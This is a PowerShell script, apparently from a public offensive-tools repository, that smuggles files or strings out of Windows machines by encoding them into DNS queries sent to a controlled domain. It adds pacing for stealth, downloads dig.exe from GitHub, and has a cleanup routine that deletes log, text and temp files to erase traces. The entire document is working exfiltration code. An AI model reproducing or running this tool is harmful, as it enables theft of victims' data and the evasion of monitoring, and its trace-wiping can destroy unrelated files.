﻿########################################################################################
#                                                                                      |
#                 ███▄ ▄███▓ ██▓ ██▓ ██▀███   ▄▄▄      ▄▄▄       ██ ▄█▀                |
#                ▓██▒▀█▀ ██▒▓██▒▓██▒▓██ ▒ ██▒▒████▄   ▒████▄     ██▄█▒                 |
#                ▓██    ▓██░▒██▒▒██▒▓██ ░▄█ ▒▒██  ▀█▄ ▒██  ▀█▄  ▓███▄░                 |
#                ▒██    ▒██ ░██░░██░▒██▀▀█▄  ░██▄▄▄▄██░██▄▄▄▄██ ▓██ █▄                 |
#                ▒██▒   ░██▒░██░░██░░██▓ ▒██▒ ▓█   ▓██▒▓█   ▓██▒▒██▒ █▄                |
#                ░ ▒░   ░  ░░▓  ░▓  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒▒   ▓▒█░▒ ▒▒ ▓▒                |
#                ░  ░      ░ ▒ ░ ▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ▒   ▒▒ ░░ ░▒ ▒░                |
#                ░      ░    ▒ ░ ▒ ░  ░░   ░   ░   ▒    ░   ▒   ░ ░░ ░                 |
#                       ░    ░   ░     ░           ░  ░     ░  ░░  ░                   |
#                                                                                      |
#     Title        : Invoke-DNSExfiltration.ps1                                        |
#     Link         : https://github.com/miiraak/Scripts/PowerShell/Exfiltration/DNS/   |
#     Version      : 3.0                                                               |
#     Category     : exfiltration/dns                                                  |
#     Target       : Windows 10/11/Server                                              |
#     Description  : Exfiltrates data by encoding it in DNS queries sent to a          |
#                    controlled domain. Supports file exfil, chunking, stealth,        |
#                    logging, cleanup, timing, multi-method, and auto-download dig.exe.|
#                                                                                      |
########################################################################################

<#
.SYNOPSIS
    Exfiltrate data by encoding it in DNS queries sent to a controlled domain.

.DESCRIPTION
    This script can exfiltrate raw string or file data through DNS queries. Data is chunked, encoded, and sent to a specified domain. Supports nslookup and dig.exe (auto-downloads dig if needed), logging, cleanup, timing, test mode, verbose output, and file exfiltration.

.PARAMETER Data
    The raw string data to exfiltrate.

.PARAMETER FilePath
    Path to a file to exfiltrate (will be base64-encoded).

.PARAMETER Domain
    The controlled domain to send DNS queries to.

.PARAMETER ChunkSize
    Number of bytes per DNS query chunk (default 60).

.PARAMETER SleepMs
    Milliseconds to sleep between DNS queries (default 150).

.PARAMETER Verbose
    Print detailed output.

.PARAMETER UseDig
    Use dig.exe if present (auto-downloads if missing) for stealth.

.PARAMETER Cleanup
    Remove all logs/traces and exit.

.PARAMETER TestMode
    Only print DNS queries; do not actually send.

.EXAMPLE
    .\Invoke-DNSExfiltration.ps1 -Data "MySecretData" -Domain "exfil.mydomain.com"
    .\Invoke-DNSExfiltration.ps1 -FilePath "C:\Users\user\Desktop\secret.txt" -Domain "exfil.mydomain.com"
    .\Invoke-DNSExfiltration.ps1 -Data "MySecretData" -UseDig
    .\Invoke-DNSExfiltration.ps1 -Data "MySecretData" -TestMode
    .\Invoke-DNSExfiltration.ps1 -Cleanup
#>

# ---------------[Parameters]--------------- #
param(
    [string]$Data = "",
    [string]$FilePath = "",
    [string]$Domain = "exfil.example.com",
    [int]$ChunkSize = 60,
    [int]$SleepMs = 150,
    [switch]$Verbose,
    [switch]$UseDig,
    [switch]$Cleanup,
    [switch]$TestMode
)

# ---------------[Functions]--------------- #
function WriteStatus {
    param([string]$msg, [string]$lvl="INFO")
    $stamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $color = switch ($lvl) {
        "ERROR"   {"Red"}
        "SUCCESS" {"Green"}
        "STEP"    {"Yellow"}
        "STEALTH" {"DarkGray"}
        "EXFIL"   {"Cyan"}
        default   {"Gray"}
    }
    Write-Output "[$lvl] $stamp :: $msg" -ForegroundColor $color
}

function ClearTraces {
    WriteStatus "Cleaning DNS exfiltration traces..." "STEP"
    $patterns = @("*.log", "*.txt", "*.tmp", "*Invoke-DNSExfiltration*.log")
    foreach ($pattern in $patterns) {
        Get-ChildItem -Path (Get-Location) -Filter $pattern -ErrorAction SilentlyContinue | ForEach-Object {
            try { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
            catch {
                WriteStatus "Failed to remove $_.FullName: $_" "ERROR"
            }
        }
    }
    WriteStatus "Cleanup finished." "SUCCESS"
    exit 0
}
if ($Cleanup) { ClearTraces }

function Get-DigPath {
    # Look for dig.exe in the script directory
    $exeName = "dig.exe"
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    $digPath = Join-Path $scriptDir $exeName
    if (Test-Path $digPath) { return $digPath }

    # If not found, download from user's repo
    $repoUrl = "https://github.com/Miiraak/Scripts/raw/master/Tools/dig.exe"
    WriteStatus "dig.exe not found, downloading from $repoUrl ..." "STEP"
    try {
        Invoke-WebRequest -Uri $repoUrl -OutFile $digPath -UseBasicParsing
        WriteStatus "dig.exe downloaded to $digPath" "SUCCESS"
        return $digPath
    } catch {
        WriteStatus "Error downloading dig.exe: $_" "ERROR"
        return $null
    }
}

function InvokeDNSExfiltration {
    param(
        [string]$Data,
        [string]$Domain,
        [int]$ChunkSize = 60,
        [int]$SleepMs = 150,
        [switch]$Verbose,
        [switch]$UseDig,
        [switch]$TestMode
    )
    if (-not $Data) { throw "No data to exfiltrate." }
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
    $chunks = @()
    for ($i = 0; $i -lt $bytes.Length; $i += $ChunkSize) {
        $chunk = $bytes[$i..([Math]::Min($i+$ChunkSize-1, $bytes.Length-1))]
        $encoded = [System.Convert]::ToBase64String($chunk).Replace("=","").Replace("+","-").Replace("/","_")
        $query = "$encoded.$Domain"
        $chunks += $query
    }
    $method = "nslookup"
    $digPath = $null
    if ($UseDig) {
        $digPath = Get-DigPath
        if ($digPath) { $method = "dig" }
        else { $method = "nslookup" }
    }
    WriteStatus "DNS method used: $method" "STEALTH"
    WriteStatus "Number of queries to send: $($chunks.Count)" "EXFIL"
    $logFile = "Invoke-DNSExfiltration-$(Get-Date -Format 'yyyyMMddHHmmss').log"
    foreach ($query in $chunks) {
        if ($Verbose) { WriteStatus "Query: $query" "STEP" }
        if ($TestMode) {
            WriteStatus "[TESTMODE] $query" "EXFIL"
        } else {
            if ($method -eq "nslookup") {
                $null = nslookup $query
            } elseif ($method -eq "dig") {
                & $digPath $query
            }
            Add-Content -Path $logFile -Value $query
        }
        Start-Sleep -Milliseconds $SleepMs
    }
}

# ---------------[Execution]--------------- #
try {
    $effectiveData = $Data
    if ($FilePath) {
        if (!(Test-Path $FilePath)) { throw "File to exfiltrate not found: $FilePath" }
        WriteStatus "Reading file to exfiltrate: $FilePath" "STEP"
        $effectiveData = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
    }
    if (-not $effectiveData) { throw "No data to exfiltrate." }
    InvokeDNSExfiltration -Data $effectiveData -Domain $Domain -ChunkSize $ChunkSize -SleepMs $SleepMs -Verbose:$Verbose -UseDig:$UseDig -TestMode:$TestMode
} catch {
    WriteStatus "$_" "ERROR"
}

# ---------------[End]--------------- #
exit 0